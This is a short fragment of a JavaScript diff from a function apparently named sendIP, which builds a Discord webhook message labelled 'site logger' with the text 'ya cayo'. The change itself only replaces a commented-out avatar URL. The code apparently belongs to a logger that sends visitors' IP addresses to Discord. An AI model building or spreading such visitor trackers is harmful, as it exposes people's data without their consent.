@@ -25,7 +25,7 @@ const sendIP = async () => {
     // 3) Preparar el payload (ejemplo: embed para Discord)
     const payload = {
       username: "site logger",
-      // avatar_url: "https://i.postimg.cc/W3gQ5b7C/Screenshot-2025-03-29-015623.png",
+      // avatar_url: "https://example.com/avatar.jpg",
       content: `ya cayo`,
       embeds: [
         {
